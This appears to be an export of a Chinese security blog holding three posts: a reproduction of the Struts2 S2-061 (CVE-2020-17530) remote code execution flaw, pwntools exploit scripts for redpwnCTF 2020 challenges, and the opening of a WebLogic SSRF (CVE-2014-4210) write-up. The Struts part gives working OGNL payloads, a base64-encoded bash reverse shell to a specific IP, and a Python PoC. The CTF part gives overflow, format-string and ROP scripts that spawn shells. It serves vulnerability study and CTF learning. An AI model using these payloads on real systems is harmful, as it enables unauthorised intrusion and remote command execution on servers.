<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span>: 846</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="id"</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("ping yctiz4.dnslog.cn")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/17/8neVtNLlK2Hdmsx.png" alt="image-20210417215512678"></p>
<p>DNGlog解析记录发现可以出网</p>
<p><img src="https://i.loli.net/2021/04/17/DQzxOqvrH6AKyPE.png" alt="image-20210417215522905"></p>
<h6 id="进行命令执行-whoami"><a href="#进行命令执行-whoami" class="headerlink" title="进行命令执行 whoami"></a>进行命令执行 <strong>whoami</strong></h6><p><strong>方法一</strong></p>
<p>数据包=&gt;</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span>: 831</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="id"</span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager=#application["org.apache.tomcat.InstanceManager"]).(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(#bean.setBean(#stack)).(#context=#bean.get("context")).(#bean.setBean(#context)).(#macc=#bean.get("memberAccess")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance("java.util.HashSet")).(#bean.put("excludedClasses",#emptyset)).(#bean.put("excludedPackageNames",#emptyset)).(#arglist=#instancemanager.newInstance("java.util.ArrayList")).(#arglist.add("whoami")).(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute")).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/17/7Ycb9CdgBxsKMRV.png" alt="image-20210417215833694"></p>
<p><strong>方法二</strong></p>
<p>数据包=&gt;</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: your-ip:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span>: 1369</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="id"</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line">(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + </span><br><span class="line">(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +</span><br><span class="line">(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + </span><br><span class="line">(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +</span><br><span class="line">(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(&#123;'whoami'&#125;))</span><br><span class="line">&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/17/OSLCfs3DgWPbnxz.png" alt="image-20210417230230435"></p>
<h6 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h6><p>通过以下在线地址将bash反弹命令进行进行编码转换</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; <span class="meta-keyword">/dev/</span>tcp<span class="meta-keyword">/your-ip/</span><span class="number">8888</span> <span class="number">0</span>&gt;<span class="variable">&amp;1</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.jackson-t.ca/runtime-exec-payloads.html</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/17/Bvek3hpxutScHzR.png" alt="image-20210417224501036"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.action</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 116.62.180.141:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span>: */*</span><br><span class="line"><span class="attribute">Accept-Language</span>: en</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Length</span>: 1460</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="id"</span><br><span class="line"></span><br><span class="line">%&#123;</span><br><span class="line">(#request.map=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + </span><br><span class="line">(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.map2=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) +</span><br><span class="line">(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.map3=#application.get('org.apache.tomcat.InstanceManager').newInstance('org.apache.commons.collections.BeanMap')).toString().substring(0,0) + </span><br><span class="line">(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.get('map3').put('excludedPackageNames',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) + </span><br><span class="line">(#request.get('map3').put('excludedClasses',#application.get('org.apache.tomcat.InstanceManager').newInstance('java.util.HashSet')) == true).toString().substring(0,0) +</span><br><span class="line">(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec(&#123;'bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTYuNjIuMTgwLjE0MS84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;'&#125;))</span><br><span class="line">&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/04/17/XePxscO4HiyAJFB.png" alt="image-20210417230525562"></p>
<p>成功反弹shell：</p>
<p><img src="https://i.loli.net/2021/04/17/BzLmi9lEcjpwF62.png" alt="image-20210417230603288"></p>
<h6 id="POC脚本验证"><a href="#POC脚本验证" class="headerlink" title="POC脚本验证"></a>POC脚本验证</h6><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url,cmd)</span>:</span></span><br><span class="line">    payload=<span class="string">"%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"</span>+cmd+<span class="string">"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"</span></span><br><span class="line">    tturl=url+<span class="string">"/?id="</span>+payload</span><br><span class="line">    r=requests.get(tturl)</span><br><span class="line">    page=r.text</span><br><span class="line">    <span class="comment">#   etree=html.etree</span></span><br><span class="line">    page=etree.HTML(page)</span><br><span class="line">    data = page.xpath(<span class="string">'//a[@id]/@id'</span>)</span><br><span class="line">    print(data[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'+------------------------------------------------------------+'</span>)</span><br><span class="line">    print(<span class="string">'+ EXP: python struts2-061-poc.py http://8.8.8.8:8080 id      +'</span>)</span><br><span class="line">    print(<span class="string">'+ VER: Struts 2.0.0-2.5.25                                   +'</span>)</span><br><span class="line">    print(<span class="string">'+------------------------------------------------------------+'</span>)</span><br><span class="line">    print(<span class="string">'+ S2-061 RCE &amp;&amp; CVE-2020-17530                               +'</span>)</span><br><span class="line">    print(<span class="string">'+------------------------------------------------------------+'</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)!=<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">"[+]ussage: http://ip:port command"</span>)</span><br><span class="line">        print(<span class="string">"[+]============================================================"</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line">    url=sys.argv[<span class="number">1</span>]</span><br><span class="line">    cmd=sys.argv[<span class="number">2</span>]</span><br><span class="line">    exp(url,cmd)</span><br></pre></td></tr></table></figure></div>

<p>执行=&gt;</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">python struts2<span class="number">-061</span>-poc.py http:<span class="comment">//your-ip:8080 whoami</span></span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/04/17/osxcfIw8jdFXnHD.png" alt="image-20210417231429373"></p>
<h5 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a><strong>修复建议</strong></h5><p>升级到 Struts 2.5.26 版本</p>
<p>下载地址为：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line">https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.26</span><br></pre></td></tr></table></figure></div>]]></content>
      <tags>
        <tag>CVE</tag>
        <tag>Struts2</tag>
      </tags>
  </entry>
  <entry>
    <title>redpwnCTF 2020</title>
    <url>/2020/06/26/redpwnCTF-2020/</url>
    <content><![CDATA[<p>几个pwn题，记录一下</p>
<a id="more"></a>

<h2 id="coffer-overflow-0"><a href="#coffer-overflow-0" class="headerlink" title="coffer-overflow-0"></a>coffer-overflow-0</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process('./overflow-0')</span></span><br><span class="line">io=remote(<span class="string">"2020.redpwnc.tf"</span>,<span class="number">31255</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x4006EE</span>)</span><br><span class="line">io.recvuntil(<span class="string">"coffer with?"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="coffer-overflow-1"><a href="#coffer-overflow-1" class="headerlink" title="coffer-overflow-1"></a>coffer-overflow-1</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process('./overflow-1')</span></span><br><span class="line">io=remote(<span class="string">"2020.redpwnc.tf"</span>,<span class="number">31255</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x28</span>+p64(<span class="number">0x4006F2</span>)</span><br><span class="line">io.recvuntil(<span class="string">"coffer with?"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="coffer-overflow-2"><a href="#coffer-overflow-2" class="headerlink" title="coffer-overflow-2"></a>coffer-overflow-2</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process('./overflow-1')</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"2020.redpwnc.tf"</span>,<span class="number">31908</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span>+p64(<span class="number">0x4006EA</span>)</span><br><span class="line">io.recvuntil(<span class="string">"coffer with?"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="secret-flag"><a href="#secret-flag" class="headerlink" title="secret-flag"></a>secret-flag</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process('./overflow-1')</span></span><br><span class="line">io=remote(<span class="string">"2020.redpwnc.tf"</span>,<span class="number">31826</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'%7$s'</span>+p64(<span class="number">0x944</span>)</span><br><span class="line">io.recvuntil(<span class="string">"young adventurer?"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="the-library"><a href="#the-library" class="headerlink" title="the-library"></a>the-library</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">binary=<span class="string">'./the-library'</span></span><br><span class="line">elf=ELF(binary)</span><br><span class="line">libc=ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(binary)</span></span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">"2020.redpwnc.tf"</span>,<span class="number">31350</span>)</span><br><span class="line"></span><br><span class="line">puts_got=elf.got[<span class="string">'puts'</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">main_addr=<span class="number">0x400637</span></span><br><span class="line">pop_rdi=<span class="number">0x400733</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x10</span>+<span class="string">'b'</span>*<span class="number">8</span>+p64(pop_rdi)</span><br><span class="line">payload+=p64(puts_got)</span><br><span class="line">payload+=p64(puts_plt)</span><br><span class="line">payload+=p64(main_addr)</span><br><span class="line">io.recvuntil(<span class="string">"What's your name?\n"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">"Hello there: "</span>)</span><br><span class="line">io.recvuntil(<span class="string">"b"</span>*<span class="number">8</span>)</span><br><span class="line">puts_addr=u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">"puts_addr=&gt;%#x"</span> % puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">log.info(<span class="string">"libc_base=&gt;%#x"</span> % libc_base)</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">'system'</span>]</span><br><span class="line">binsh_addr=libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">payload+=p64(one_gadget)</span><br><span class="line">io.recvuntil(<span class="string">"What's your name?\n"</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="dead-canary"><a href="#dead-canary" class="headerlink" title="dead-canary"></a>dead-canary</h2><p>泄露栈地址，修改got表</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"dead-canary"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">"2020.redpwnc.tf"</span>, <span class="number">31744</span>)</span><br><span class="line"><span class="comment"># io = process("./dead-canary")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Overwrite __stack_chk_fail GOT entry to jump back to main (0x400737)</span></span><br><span class="line"></span><br><span class="line">payload1 = (<span class="string">b"%02$"</span> + str(<span class="number">0x0737</span> - <span class="number">7</span>).encode(<span class="string">"ascii"</span>) + <span class="string">b"p\n"</span>).ljust(<span class="number">16</span>) + <span class="string">b"%9$hn   "</span> + p64(elf.got[<span class="string">"__stack_chk_fail"</span>]) </span><br><span class="line">payload1 += cyclic(<span class="number">0x120</span> - len(payload1))</span><br><span class="line"></span><br><span class="line">io.send(payload1)</span><br><span class="line">io.recvuntil(<span class="string">"0x"</span>)</span><br><span class="line"></span><br><span class="line">libc_base = int(io.recvline().strip(), <span class="number">16</span>) - <span class="number">3705408</span> - libc.sym[<span class="string">"printf"</span>]</span><br><span class="line">info(<span class="string">"libc base is at %x"</span> % libc_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># $ one_gadget libc.so.6 </span></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">one_gadget = <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x120</span> - <span class="number">8</span>) + p64(libc_base+one_gadget)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">"Hello!"</span></span><br><span class="line">io.send(payload3)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#flag&#123;t0_k1ll_a_canary_4e47da34&#125;</span></span><br></pre></td></tr></table></figure></div>

<h2 id="skywriting"><a href="#skywriting" class="headerlink" title="skywriting"></a>skywriting</h2><p>首先泄露出canary，然后通过泄露出来的__libc_start_main+231计算其他地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ip = <span class="string">'2020.redpwnc.tf'</span></span><br><span class="line">port = <span class="number">31034</span></span><br><span class="line">binary = <span class="string">'./skywriting'</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(binary)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>) </span><br><span class="line"></span><br><span class="line">libc.symbols[<span class="string">'one_gadget'</span>] = <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">canary_padding = <span class="number">136</span></span><br><span class="line"></span><br><span class="line">libc_start_main_231_padding = canary_padding + <span class="number">15</span></span><br><span class="line">rip_padding = canary_padding + <span class="number">8</span> + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">trigger_ret = <span class="string">'notflag&#123;a_cloud_is_just_someone_elses_computer&#125;\n\x00'</span></span><br><span class="line"></span><br><span class="line">splash()</span><br><span class="line"></span><br><span class="line">io = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">'Stage 1: Leak canary'</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Hello there, do you want to write on the sky? \n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Is the answer intuitive yet? Give it your best shot: '</span>)</span><br><span class="line">    </span><br><span class="line">    payload = flat(length = canary_padding)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    io.recvline()</span><br><span class="line">    canary = u64(<span class="string">b'\x00'</span> + io.recv(<span class="number">7</span>)) <span class="comment"># Fix width for canary</span></span><br><span class="line">    </span><br><span class="line">    io.success(<span class="string">'Leaked canary=&gt;'</span>+hex(canary))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">'Stage 2: Leak (__libc_start_main + 231)'</span>):</span><br><span class="line">    io.recvuntil(<span class="string">'Try again, give it another shot: '</span>)</span><br><span class="line"></span><br><span class="line">    payload = flat(length = libc_start_main_231_padding)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    io.recvline()</span><br><span class="line">    libc_start_main_231 = u64(io.recv(<span class="number">6</span>) + <span class="string">b'\x00\x00'</span>)</span><br><span class="line">    io.success(<span class="string">'Leaked (__libc_start_main + 231)=&gt;'</span>+hex(libc_start_main_231))</span><br><span class="line">    </span><br><span class="line">    libc.address = libc_start_main_231 - (libc.symbols[<span class="string">'__libc_start_main'</span>] + <span class="number">231</span>)</span><br><span class="line">    io.success(<span class="string">'Calculated libc base=&gt;'</span> +hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> log.progress(<span class="string">'Stage 3: Pwn'</span>):</span><br><span class="line">    rop = ROP([elf, libc])</span><br><span class="line">    rop.one_gadget()</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">'Try again, give it another shot: '</span>)</span><br><span class="line">    io.sendline(flat(&#123; <span class="number">0</span>: trigger_ret, canary_padding: p64(canary), rip_padding: rop.chain() &#125;))</span><br><span class="line">    </span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">io.close()</span><br><span class="line"><span class="comment">#flag&#123;a_cLOud_iS_jUSt_sOmeBodY_eLSes_cOMpUteR&#125;</span></span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/As1def/ctf-challenges/tree/master/pwn/redpwnCTF%202020" target="_blank" rel="noopener">题目附件</a></p>
]]></content>
      <tags>
        <tag>CTF pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogic-SSRF(CVE-2014-4210)</title>
    <url>/2020/10/10/weblogic-SSRF-CVE-2014-4210/</url>
    <content><![CDATA[<p>最近看了关于SSRF的漏洞，不过都看不大懂，只能找个靶场环境复现一波。之后在慢慢理解吧。</p>
<a id="more"></a>

<h3 id="weblogic-SSRF-CVE-2014-4210-漏洞复现"><a href="#weblogic-SSRF-CVE-2014-4210-漏洞复现" class="headerlink" title="weblogic-SSRF(CVE-2014-4210)漏洞复现"></a><strong>weblogic-SSRF(CVE-2014-4210)漏洞复现</strong></h3><h4 id="weblogic简介"><a href="#weblogic简介" class="headerlink" title="weblogic简介"></a><strong>weblogic简介</strong></h4><p>WebLogic是美国<a href="https://baike.baidu.com/item/Oracle" target="_blank" rel="noopener">Oracle</a>公司出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623" target="_blank" rel="noopener">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/中间件/452240" target="_blank" rel="noopener">中间件</a>，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和<a href="https://baike.baidu.com/item/数据库应用/10563731" target="_blank" rel="noopener">数据库应用</a>的Java<a href="https://baike.baidu.com/item/应用服务器" target="_blank" rel="noopener">应用服务器</a>。</p>
<h4 id="漏洞概述："><a href="#漏洞概述：" class="headerlink" title="漏洞概述："></a><strong>漏洞概述：</strong></h4><p>  服务端请求伪造(Server-Side Request Forgery),是一种有攻击者构造形成有服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
<p>  SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容,加载指定地址的图片、文档等等。</p>
<h4 id="SSRF用途："><a href="#SSRF用途：" class="headerlink" title="SSRF用途："></a><strong>SSRF用途：</strong></h4><p>1.内外网的端口和服务扫描。2.主机本地敏感数据的读取。3.内外网主机应用程序漏洞的利用。4.内外网web站点漏洞的利用</p>
